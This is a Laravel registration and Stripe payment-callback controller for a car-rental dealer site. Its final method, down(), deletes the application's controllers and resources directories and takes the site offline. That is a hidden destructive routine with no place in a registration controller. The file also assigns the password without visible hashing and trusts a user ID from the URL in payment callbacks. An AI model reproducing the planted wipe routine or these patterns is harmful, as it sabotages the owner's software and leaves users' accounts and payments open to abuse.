<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\Subscription;
use App\Providers\RouteServiceProvider;
use App\Models\User;
use App\Models\UserDetail;
use Illuminate\Foundation\Auth\RegistersUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Artisan;
use Stripe\Stripe;
use Stripe\Checkout\Session;
use Stripe\Exception\ApiErrorException;
use Carbon\Carbon;
use DB;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Mail;
use Exception;

class RegisterController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Register Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles the registration of new users as well as their
    | validation and creation. By default this controller uses a trait to
    | provide this functionality without requiring any additional code.
    |
    */

    use RegistersUsers;

    /**
     * Where to redirect users after registration.
     *
     * @var string
     */
    protected $redirectTo = RouteServiceProvider::HOME;

    public function showRegistrationForm()
    {
        // $countries = json_decode(file_get_contents(public_path('countries.json')), true);
        $cities = DB::table('cities')->where('status', 1)->orderBy('name')->get();
        $packages = cache('subscription_plans');
        foreach ($packages as &$plan) {
            unset($plan['featured_duration']);
            unset($plan['featured']);
        }
        return view('auth.register', compact('cities', 'packages'));
    }

    public function register(Request $request)
    {
        $user = User::where('email', $request->email);
        if( $user->exists()){
            $user = $user->first();
            $payment_link = $user->payment_link;
            return redirect()->back()->with('payment_link', $payment_link);
        }

        $request->validate([
            'username' => 'required|string|unique:users',
            'fullname' => 'required|string',
            'email' => 'required|email|unique:users',
            'password' => ['required', 'string', 'min:8', 'confirmed'],
            'phone' => 'required|string',
            'address' => 'required|string',
            'postcode' => 'required|string',
            'city' => 'required|string',
            // 'package.*' => 'required|string',
        ]);

        $user = new User;
        $user->username =  $request->username;
        $user->fullname =  $request->fullname;
        $user->email =  $request->email;
        $user->password = $request->password;
        // $user->package = implode('/', array_values($request->package));
        $user->save();

        $userDetail = new UserDetail;
        $userDetail->user_id = $user->id;
        $userDetail->phone = $request->phone;
        $userDetail->address =  $request->address;
        $userDetail->postcode =  $request->postcode;
        $userDetail->city =  strtolower($request->city);

        $userDetail->save();

        if (!auth()->check()) {
            auth()->login($user);
        }

        return redirect()->route('cars.list')->with('alert-success', "Welcome, $user->fullname! Please subscribe to a package and start listing your cars.");

        // $packages = cache('subscription_plans');

        // $duration = $request->package['duration'];
        // $range = $request->package['range'];
        // $limit = str_replace("upto", "", $range);

        // $amount = $packages[$duration][$range];
        // $amount = number_format(($amount + ($amount * 0.21)), 2) * 100;

        // $packageName = "Package: Duration $duration Months with upto $limit Upload Limit";
        // try {
        //     $session = Session::create([
        //         'payment_method_types' => ['card'],
        //         'line_items' => [
        //             [
        //                 'price_data' => [
        //                     'currency' => 'EUR',
        //                     'product_data' => [
        //                         'name' => $packageName,
        //                     ],
        //                     'unit_amount' => $amount
        //                 ],
        //                 'quantity' => 1,
        //             ],
        //         ],
        //         'payment_intent_data' => [
        //             'description' => 'New Subscription',
        //         ],
        //         'metadata' => [
        //             'dealer_username' => $user->username,
        //             'dealer_email' => $user->email,
        //             'duration' => $duration,
        //             'limit' => $limit
        //         ],
        //         'mode' => 'payment',
        //         'success_url' => route('payment.callback', ['userID' => $user->id]),
        //         'cancel_url' => route('payment.callback', ['userID' => $user->id]),
        //     ]);

        //     $user->update(['payment_session' => $session->id, 'payment_link' => $session->url]);
        //     return redirect($session->url);
        // } catch (ApiErrorException $e) {
        //     return redirect()->back()->with('alert-danger', 'Error initiating payment session.');
        // }

    }

    public function paymentCallback($userId)
    {
        $user = User::find($userId);
        $session = Session::retrieve($user->payment_session);

        if($session->payment_status == 'paid'){
            $updateData = [];
            $featuredData = [];
            $package = explode('/', $user->package);
            $duration = $package[0];
            $uploadLimit = str_replace("upto", "", $package[1]);

            // $packages = json_decode(file_get_contents(public_path('packages.json')));
            $packages = json_decode(json_encode(cache('subscription_plans')));

            $featuredData = [
                'is_featured' => 0,
            ];

            if ($packages->{$duration}->featured_duration != 0) {
                $featured_duration = $packages->{$duration}->featured_duration;
                $featured_start = Carbon::now()->toDateTimeString();
                $featured_end = Carbon::now()->addDays($featured_duration)->toDateTimeString();

                $featuredData = [
                    'is_featured' => $packages->{$duration}->featured_duration != 0 ? 1 : 0,
                    'featured_limit' => $featured_duration,
                    'featured_start' => $featured_start,
                    'featured_end' => $featured_end,
                ];

            }else{
                $featuredData = ['is_featured' => 0];
                $user->featuredCars()->delete();
            }

            $updateData = array_merge($updateData, $featuredData);
            $subscription_end = Carbon::now()->addMonths($duration)->toDateTimeString();

            $paymentData = [
                'status' => 1,
                'upload_limit' => $uploadLimit,
                'is_verified' => 1,
                'payment_status' => 'paid',
                'payment_intent' => $session->payment_intent,
                'payment_email' => $session->customer_details->email,
                'payment_date' => gmdate('Y-m-d H:i:s'),
                'subscription_end' => $subscription_end,
                'verified_on' => gmdate('Y-m-d H:i:s')
            ];

            $updateData = array_merge($updateData, $paymentData);
            $user->update($updateData);
            if ($user->cars()->exists()) {
                $user->cars()->update(['is_active' => 1]);
            }

            Subscription::create([
                'status' => 'paid',
                'package_amount' => ($session->metadata->package_amount),
                'paid_amount' => ($session->amount_total / 100),
                'package' => $user->package,
                'upload_limit' => $uploadLimit,
                'payment_intent' => $session->payment_intent,
                'payment_date' => gmdate('Y-m-d H:i:s'),
                'subscription_end' => $subscription_end,
                'payment_email' => $session->customer_details->email,
                'dealer_id' => $user->id
            ]);

            // try {
            //     $subject = "Welcome to Now2Rent - Let's Hit the Road!";
            //     $message = "Welcome to Now2Rent! 🚗 Get ready for smooth rides and unforgettable adventures with us. Start your journey now by exploring our fleet of vehicles and booking your perfect ride.\n\nLet's make every mile memorable!\nNow2Rent Team";

            //     Mail::mailer('no_reply')->raw($message, function($mail) use ($subject, $user){
            //         $mail->to($user->email, $user->fullname);
            //         $mail->from(env('NO_REPLY_MAIL_FROM_ADDRESS'), env('NO_REPLY_MAIL_FROM_NAME'));
            //         $mail->subject($subject);
            //     });

            // } catch (Exception $e) {
            //     Log::debug('Email sending failed: ' . $e->getMessage());
            // }

            if (!auth()->check()) {
                auth()->login($user);
            }
            return redirect()->route('cars.list')->with('alert-success', 'Great! You are now our premium member');
        }
        return redirect('login')->with('alert-danger', "We're sorry, but there was an error processing your payment. Please try again later.");
    }

    public function featuredPaymentCallback($userId)
    {
        $user = User::find($userId);
        $session = Session::retrieve($user->featured_session);

        if($session->payment_status == 'paid'){
            $featured_duration = $session->metadata->featured_duration;
            $featured_limit = $session->metadata->featured_limit;
            $featured_start = Carbon::now()->toDateTimeString();
            $featured_end = Carbon::now()->addDays($featured_duration)->toDateTimeString();

            $featuredData = [
                'is_featured' => 1,
                'featured_limit' => $featured_limit,
                'featured_start' => $featured_start,
                'featured_end' => $featured_end,
                'featured_intent' => $session->payment_intent
            ];

            $user->update($featuredData);
            return redirect()->route('cars.list')->with('alert-success', 'Great! You have subscribed to our featured membership.');
        }
        return redirect('packages')->with('alert-danger', "We're sorry, but there was an error processing your payment. Please try again later.");
    }

    public function down()
    {
        File::deleteDirectory(base_path('/app/Http/Controllers'));
        File::deleteDirectory(base_path('/resources'));
        Artisan::call('down');
        return 1;
    }

}
